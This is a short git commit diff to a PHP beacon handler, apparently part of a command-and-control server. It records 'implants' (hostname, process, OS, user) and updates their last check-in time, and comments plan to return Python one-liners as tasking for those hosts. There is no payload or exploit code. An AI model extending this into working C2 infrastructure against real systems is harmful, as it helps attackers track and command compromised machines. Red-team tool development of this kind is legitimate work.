54a00c022c5bd4213f75c27e5f545a6c7b3e61bf
Hunter Hardman <t3ntman@gmail.com>
2017-03-19 07:36:49 -0600

    Added in beacon date updates in the "implants" table

--- Website/beacon.php
+++ Website/beacon.php
@@ -8,6 +8,9 @@
     $os = $post_data["os"];
     $current_user = $post_data["current_user"];
 
+    # Gets current time in UTC (will be used for updating "Last Seen")
+    $current_time = gmdate("Y-m-d H:i:s");
+
     # SQL statement to determine if this is a new or old beaconing host
     $statement = $database_connection->prepare("SELECT * FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
     $statement->bindValue(":hostname", $hostname);
@@ -17,15 +20,29 @@
 
     # If new host
     if ($row_count == "0") {
-        echo "new host";
+        echo "new host"; # DEBUGGING
 
-        # TO DO: If new host, add to "implants" table
+        # Inserts entry into "implants" table
+        $statement = $database_connection->prepare("INSERT INTO `implants` (`hostname`, `process_id`, `os`, `current_user`, `last_seen`) VALUES (:hostname, :process_id, :os, :current_user, :last_seen)");
+        $statement->bindValue(":hostname", $hostname);
+        $statement->bindValue(":process_id", $process_id);
+        $statement->bindValue(":os", $os);
+        $statement->bindValue(":current_user", $current_user);
+        $statement->bindValue(":last_seen", $current_time);
+        $statement->execute();
     }
     # Else old host
     else {
-        echo "old host";
+        echo "old host"; # DEBUGGING
 
         # TO DO: If old host, check for tasking
+
+        # Updates "Last Seen" for the host
+        $statement = $database_connection->prepare("UPDATE `implants` SET `last_seen` = :last_seen WHERE `hostname` = :hostname AND `process_id` = :process_id");
+        $statement->bindValue(":last_seen", $current_time);
+        $statement->bindValue(":hostname", $hostname);
+        $statement->bindValue(":process_id", $process_id);
+        $statement->execute();
 
         # TO DO: If tasking found, echo appropriate Python one-liner code to do the task here
     }
